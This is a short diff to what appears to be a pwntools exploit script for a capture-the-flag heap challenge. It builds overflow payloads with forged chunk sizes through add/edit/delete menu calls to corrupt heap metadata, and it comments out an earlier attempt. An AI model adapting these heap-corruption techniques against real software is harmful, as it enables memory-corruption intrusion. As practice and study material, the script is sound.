@@ -117,18 +117,34 @@ payload = b'\0'*236+p64(0)+p64(0x221)
 edit(payload)
 delete()
 
+
+add(0x200)
+delete()
+add(0x7f)
+payload = b'\0'*(236-40)+p64(0x41)
+edit(payload)
+add(0x200)
+payload = b'\0'*236+p64(0x220)+p64(0x260)
+edit(payload)
+pause()
+delete()
+
+
+
+'''
 add(0x200) # chunk B
 add(0x200) # chunk C
 delete()
 add(0x7f)
 #payload = b'\0'*4+b'\0'*0x30+p64(0x4f)
-payload = b'\0'*(236-40)+p64(0x4f)
+payload = b'\0'*(236-40)+p64(0x41)
 edit(payload)
 add(0x200)
 payload = b'\0'*236+p64(0x4b0)+p64(0x260)
 edit(payload)
 pause()
 delete()
+'''
 
 
 add(0x148)
